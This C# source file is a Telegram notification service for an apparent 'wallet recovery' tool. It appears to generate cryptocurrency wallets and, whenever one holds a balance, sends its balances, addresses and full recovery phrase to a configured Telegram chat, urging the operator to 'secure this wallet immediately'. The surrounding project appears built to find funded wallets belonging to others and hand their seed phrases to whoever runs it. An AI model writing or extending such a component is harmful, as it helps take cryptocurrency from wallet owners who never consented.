using System;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace WalletRecoveryTool.Core
{
    /// <summary>
    /// Telegram Bot API service for instant wallet found alerts
    /// Setup: 1) Message @BotFather to create bot, 2) Get bot token, 3) Get your chat ID from @userinfobot
    /// </summary>
    public static class TelegramAlertService
    {
        private static readonly HttpClient _httpClient = new HttpClient();
        private const string TELEGRAM_API_BASE = "https://api.telegram.org/bot";

        /// <summary>
        /// Send wallet found alert via Telegram
        /// </summary>
        public static async Task SendWalletFoundAlertAsync(CryptoWalletGenerator.WalletInfo wallet, AppSettings settings)
        {
            if (string.IsNullOrEmpty(settings.TelegramBotToken))
                throw new InvalidOperationException("Telegram Bot Token not configured. Get one from @BotFather on Telegram.");

            if (string.IsNullOrEmpty(settings.TelegramChatId))
                throw new InvalidOperationException("Telegram Chat ID not configured. Get yours from @userinfobot on Telegram.");

            var message = BuildAlertMessage(wallet);
            await SendMessageAsync(settings.TelegramBotToken, settings.TelegramChatId, message);
        }

        /// <summary>
        /// Send a test message to verify configuration
        /// </summary>
        public static async Task<bool> SendTestMessageAsync(string botToken, string chatId)
        {
            try
            {
                var message = "🧪 *Wallet Recovery Tool - Test Alert*\n\n" +
                              "✅ Telegram notifications are working!\n" +
                              $"📅 {DateTime.Now:yyyy-MM-dd HH:mm:ss}\n\n" +
                              "You will receive alerts here when wallets with balance are found.";
                
                await SendMessageAsync(botToken, chatId, message);
                return true;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Send message via Telegram Bot API
        /// </summary>
        private static async Task SendMessageAsync(string botToken, string chatId, string message)
        {
            var url = $"{TELEGRAM_API_BASE}{botToken}/sendMessage";
            
            var payload = new
            {
                chat_id = chatId,
                text = message,
                parse_mode = "Markdown",
                disable_web_page_preview = true
            };

            var json = JsonConvert.SerializeObject(payload);
            var content = new StringContent(json, Encoding.UTF8, "application/json");

            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(30));
            var response = await _httpClient.PostAsync(url, content, cts.Token).ConfigureAwait(false);
            
            if (!response.IsSuccessStatusCode)
            {
                var error = await response.Content.ReadAsStringAsync();
                throw new InvalidOperationException($"Telegram API error: {error}");
            }
        }

        /// <summary>
        /// Build formatted alert message
        /// </summary>
        private static string BuildAlertMessage(CryptoWalletGenerator.WalletInfo wallet)
        {
            var sb = new StringBuilder();
            sb.AppendLine("🎉 *WALLET WITH BALANCE FOUND!*");
            sb.AppendLine();
            sb.AppendLine($"📅 Found: {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
            sb.AppendLine();
            
            // Balances
            sb.AppendLine("💰 *Balances:*");
            if (wallet.Balances != null)
            {
                foreach (var balance in wallet.Balances)
                {
                    if (balance.Value > 0)
                    {
                        var emoji = balance.Key switch
                        {
                            "BTC" => "₿",
                            "ETH" => "Ξ",
                            "SOL" => "◎",
                            "USDT" => "💵",
                            "LTC" => "Ł",
                            "DOGE" => "🐕",
                            "MATIC" => "🟣",
                            "BNB" => "🟡",
                            _ => "•"
                        };
                        sb.AppendLine($"  {emoji} {balance.Key}: `{balance.Value:F8}`");
                    }
                }
            }
            
            sb.AppendLine();
            sb.AppendLine("🔑 *Recovery Phrase:*");
            sb.AppendLine($"`{wallet.Mnemonic}`");
            sb.AppendLine();
            
            // Addresses (truncated for security)
            sb.AppendLine("📍 *Addresses:*");
            if (!string.IsNullOrEmpty(wallet.BitcoinAddress))
                sb.AppendLine($"  BTC: `{wallet.BitcoinAddress}`");
            if (!string.IsNullOrEmpty(wallet.EthereumAddress))
                sb.AppendLine($"  ETH: `{wallet.EthereumAddress}`");
            if (!string.IsNullOrEmpty(wallet.SolanaAddress))
                sb.AppendLine($"  SOL: `{wallet.SolanaAddress.Substring(0, Math.Min(20, wallet.SolanaAddress.Length))}...`");
            
            sb.AppendLine();
            sb.AppendLine("⚠️ _Secure this wallet immediately!_");
            
            return sb.ToString();
        }

        /// <summary>
        /// Get bot info to verify token is valid
        /// </summary>
        public static async Task<string> GetBotInfoAsync(string botToken)
        {
            try
            {
                var url = $"{TELEGRAM_API_BASE}{botToken}/getMe";
                var response = await _httpClient.GetStringAsync(url).ConfigureAwait(false);
                dynamic data = JsonConvert.DeserializeObject(response);
                
                if (data.ok == true)
                {
                    return $"✅ Bot: @{data.result.username} ({data.result.first_name})";
                }
                return "❌ Invalid bot token";
            }
            catch (Exception ex)
            {
                return $"❌ Error: {ex.Message}";
            }
        }
    }
}
